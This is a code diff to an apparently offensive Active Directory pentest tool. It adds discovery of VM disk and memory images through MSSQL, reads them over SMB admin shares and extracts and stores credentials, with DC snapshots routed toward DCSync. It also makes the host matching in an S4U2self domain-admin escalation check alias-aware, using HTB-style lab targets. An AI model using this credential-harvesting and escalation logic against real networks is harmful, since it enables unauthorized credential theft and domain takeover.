@@ -958,6 +958,15 @@ def _run_mssql_filesystem_mapping(
             continue
         results.append(_run_phase(phase))
 
+    # VM disk artifacts (.vhd/.vmdk/...) are not in any byte-phase extension set, so
+    # the loop above never sees them. Discover them from the MSSQL filesystem map
+    # and extract credentials offline via a native SMB sparse read (the read needs
+    # SMB/445 to the host — MSSQL is the discovery transport, not the read one).
+    _run_mssql_vm_disk_scan(
+        shell, domain=domain, host=host, entries=entries,
+        username=username, password=password,
+    )
+
     loot_root_rel = os.path.relpath(run_root_abs, _get_workspace_dir(shell))
     print_info(
         "Deterministic MSSQL analysis completed. "
@@ -970,6 +979,88 @@ def _run_mssql_filesystem_mapping(
         "entry_count": len(entries),
         "phases_run": results,
     }
+
+
+def _run_mssql_vm_disk_scan(
+    shell: MssqlShell,
+    *,
+    domain: str,
+    host: str,
+    entries: list[object],
+    username: str,
+    password: str,
+) -> int:
+    """Extract credentials from VM disk artifacts found in the MSSQL filesystem map.
+
+    MSSQL (``xp_dirtree``-style mapping) is the DISCOVERY transport; the disk image
+    is read over native SMB (sparse, single persistent session) — so this needs
+    SMB/445 reachable to ``host``. Absolute ``C:\\`` paths from the map are
+    translated to an SMB admin share. DC snapshots route through the DCSync selector,
+    member-server snapshots through host-scoped local persistence. Best-effort:
+    never aborts the surrounding scan.
+    """
+    try:
+        from adscan_internal.cli.vm_artifact_credentials import (
+            persist_vm_disk_credentials,
+        )
+        from adscan_internal.services.vm_artifact_service import (
+            VMArtifactService,
+            classify_vm_artifact,
+            windows_path_to_admin_share,
+        )
+
+        vm_entries = [
+            (entry, classify_vm_artifact(str(getattr(entry, "full_name", "") or "")))
+            for entry in entries
+        ]
+        vm_entries = [(e, k) for (e, k) in vm_entries if k in ("disk", "memory")]
+        if not vm_entries:
+            return 0
+        print_info(
+            f"VM artifact scan: found {len(vm_entries)} VM disk/memory artifact(s) in "
+            "the MSSQL filesystem map — extracting credentials offline (disk: sparse "
+            "SMB read; memory: download + Volatility 3)."
+        )
+        service = VMArtifactService()
+        stored_total = 0
+        for entry, kind in vm_entries:
+            full_name = str(getattr(entry, "full_name", "") or "")
+            vm_share, vm_relpath = windows_path_to_admin_share(full_name)
+            if kind == "memory":
+                extraction = service.extract_from_smb_memory(
+                    shell=shell,
+                    domain=domain,
+                    host=host,
+                    share=vm_share or "C$",
+                    source_path=vm_relpath or full_name,
+                    auth_username=username,
+                    auth_password=password,
+                )
+            else:
+                size = int(getattr(entry, "length", 0) or 0)
+                extraction = service.extract_from_smb_disk(
+                    shell=shell,
+                    domain=domain,
+                    host=host,
+                    share=vm_share or "C$",
+                    source_path=vm_relpath or full_name,
+                    size=size or None,  # None -> resolved via native aiosmb stat
+                    auth_username=username,
+                    auth_password=password,
+                )
+            persist_result = persist_vm_disk_credentials(
+                shell,
+                domain=domain,
+                host=host,
+                source_label=full_name,
+                extraction=extraction,
+            )
+            stored_total += int(getattr(persist_result, "stored", 0) or 0)
+        return stored_total
+    except Exception as exc:  # noqa: BLE001 - VM disk scan must never abort the MSSQL scan
+        telemetry.capture_exception(exc)
+        print_info_debug(f"MSSQL VM disk artifact scan failed (non-fatal): {exc}")
+        return 0
 
 
 def check_pivot_reachability_via_mssql(
@@ -1345,6 +1436,35 @@ def check_pivot_reachability_via_mssql(
         )
 
 
+def _load_mssql_host_alias_inventory(
+    shell: MssqlShell, domain: str
+) -> dict[str, list[str]]:
+    """Return the workspace IP <-> hostname map for one domain (best-effort).
+
+    Reuses :func:`load_workspace_ip_hostname_inventory` (massdns +
+    network-reachability reports) so the SPN-ownership gate bridges an
+    IP-form MSSQL target to its resolved FQDN exactly as the rest of the
+    runtime does. Never raises — an unreadable/absent workspace yields ``{}``.
+    """
+    from adscan_internal.services.kerberos_hostname_inventory import (  # noqa: PLC0415
+        load_workspace_ip_hostname_inventory,
+    )
+
+    try:
+        workspace_dir = _get_workspace_dir(shell)
+        domains_dir = str(getattr(shell, "domains_dir", "") or "")
+        if not workspace_dir or not domains_dir:
+            return {}
+        return load_workspace_ip_hostname_inventory(
+            workspace_dir=workspace_dir,
+            domains_dir=domains_dir,
+            domain=domain,
+        )
+    except Exception as exc:  # noqa: BLE001 - degrade to no-inventory
+        telemetry.capture_exception(exc)
+        return {}
+
+
 def _service_account_owns_mssql_spn(
     shell: MssqlShell, *, domain: str, host: str, service_account: str
 ) -> bool:
@@ -1356,15 +1476,45 @@ def _service_account_owns_mssql_spn(
     SPN's host portion against the target host (FQDN, short name, or NetBIOS),
     not the port, so ``MSSQLSvc/breachdc.breach.vl:1433`` and
     ``MSSQLSvc/breachdc.breach.vl`` both qualify.
+
+    The host match is **alias-aware**: when the MSSQL connection target is an
+    IP (the common case for HTB/VPN runs) and the owned SPN is FQDN-based, the
+    raw token compare can never match (``10.129.13.221`` vs
+    ``breachdc.breach.vl``). We therefore expand BOTH the target host and each
+    SPN host into their alias key sets via the canonical
+    :func:`expand_host_aliases` (IP <-> short <-> FQDN <-> ``HOST$``), bridged
+    through the workspace's resolved IP <-> hostname inventory, and compare the
+    sets. This mirrors the IP->FQDN resolution the downstream mint step already
+    performs, so the gate never rejects a path the mint step could satisfy.
+
+    Emits a structured ``--debug`` skip reason distinguishing the three
+    negative realities (account not in collector data / owns zero MSSQLSvc SPNs
+    / owns MSSQLSvc SPN(s) but none matched the target host after alias
+    resolution) so a false-skip is diagnosable from the recording alone.
     """
+    from adscan_internal.services.domain_controller_classifier import (  # noqa: PLC0415
+        expand_host_aliases,
+    )
+
+    marked_user = mark_sensitive(service_account, "user")
+    marked_host = mark_sensitive(host, "hostname")
     try:
         service = None
         if hasattr(shell, "_get_graph_service"):
             service = shell._get_graph_service()  # type: ignore[attr-defined]
         if service is None or not hasattr(service, "get_user_node_by_samaccountname"):
+            print_info_debug(
+                f"mssql s4u2self gate: graph service unavailable; cannot verify "
+                f"MSSQLSvc SPN ownership for {marked_user} on {marked_host}."
+            )
             return False
         node = service.get_user_node_by_samaccountname(domain, service_account)
         if not isinstance(node, dict):
+            print_info_debug(
+                f"mssql s4u2self gate: account {marked_user} not found in collector "
+                f"data for domain {mark_sensitive(domain, 'domain')} — cannot verify "
+                f"MSSQLSvc SPN ownership on {marked_host}."
+            )
             return False
         # ``get_user_node_by_samaccountname`` (local_graph_service._find_node)
         # returns the FLATTENED properties dict directly, so ``serviceprincipalnames``
@@ -1376,17 +1526,49 @@ def _service_account_owns_mssql_spn(
         telemetry.capture_exception(exc)
         return False
 
-    host_token = str(host or "").strip().lower()
-    short_host = host_token.split(".", 1)[0]
+    # Collect the MSSQLSvc SPNs the account actually owns (host portion, no port).
+    mssql_spn_hosts: list[str] = []
     for spn in spns:
-        spn_str = str(spn or "").strip().lower()
-        if not spn_str.startswith("mssqlsvc/"):
+        spn_str = str(spn or "").strip()
+        if not spn_str.lower().startswith("mssqlsvc/"):
             continue
-        spn_host = spn_str.split("/", 1)[1]
-        spn_host = spn_host.split(":", 1)[0]  # strip optional :port
-        spn_short = spn_host.split(".", 1)[0]
-        if host_token and (spn_host == host_token or spn_short == short_host):
+        spn_host = spn_str.split("/", 1)[1].split(":", 1)[0].strip()
+        if spn_host:
+            mssql_spn_hosts.append(spn_host)
+
+    if not mssql_spn_hosts:
+        print_info_debug(
+            f"mssql s4u2self gate: account {marked_user} found in collector data but "
+            f"owns zero MSSQLSvc SPNs — skipping S4U2self offer on {marked_host}."
+        )
+        return False
+
+    host_token = str(host or "").strip()
+    if not host_token:
+        return False
+
+    # Alias-aware comparison: expand the target host and each SPN host into the
+    # canonical key sets, bridged via the workspace IP <-> hostname inventory so
+    # an IP-form MSSQL target matches an FQDN-form SPN (and vice versa).
+    inventory = _load_mssql_host_alias_inventory(shell, domain)
+    target_keys = expand_host_aliases(host_token, ip_hostname_inventory=inventory)
+    for spn_host in mssql_spn_hosts:
+        spn_keys = expand_host_aliases(spn_host, ip_hostname_inventory=inventory)
+        if target_keys & spn_keys:
             return True
+
+    alias_attempted = bool(inventory)
+    # Bracket-free SPN list: Rich would parse a leading "[" as console markup
+    # and silently drop the line (CLAUDE.md: square-brackets-eat-markup rule).
+    owned_spn_display = mark_sensitive(
+        ", ".join(f"MSSQLSvc/{h}" for h in mssql_spn_hosts), "text"
+    )
+    print_info_debug(
+        f"mssql s4u2self gate: account {marked_user} owns MSSQLSvc SPNs "
+        f"{owned_spn_display} but none matched target host {marked_host} "
+        f"(alias resolution {'attempted' if alias_attempted else 'unavailable'}) "
+        f"— skipping S4U2self offer."
+    )
     return False
 
 
@@ -1499,7 +1681,6 @@ def _try_mssql_s4u2self_as_da(
     )
 
     marked_host = mark_sensitive(host, "hostname")
-    marked_user = mark_sensitive(service_account_username, "user")
 
     # --- Precondition 1: usable credential material (no ccache-only here) ---
     secret = str(service_account_secret or "").strip()
@@ -1511,13 +1692,11 @@ def _try_mssql_s4u2self_as_da(
         return None
 
     # --- Precondition 2: the principal owns the MSSQLSvc SPN on this host ---
+    # The precise skip reason (account not found / zero MSSQLSvc SPNs / owned
+    # but host mismatch after alias resolution) is logged inside the gate.
     if not _service_account_owns_mssql_spn(
         shell, domain=domain, host=host, service_account=service_account_username
     ):
-        print_info_debug(
-            f"[mssql][s4u2self] {marked_user} does not own an MSSQLSvc SPN on "
-            f"{marked_host} per collector data — skipping S4U2self offer."
-        )
         return None
 
     # --- DC/KDC resolution (FQDN SPN enforced inside the primitive) ---
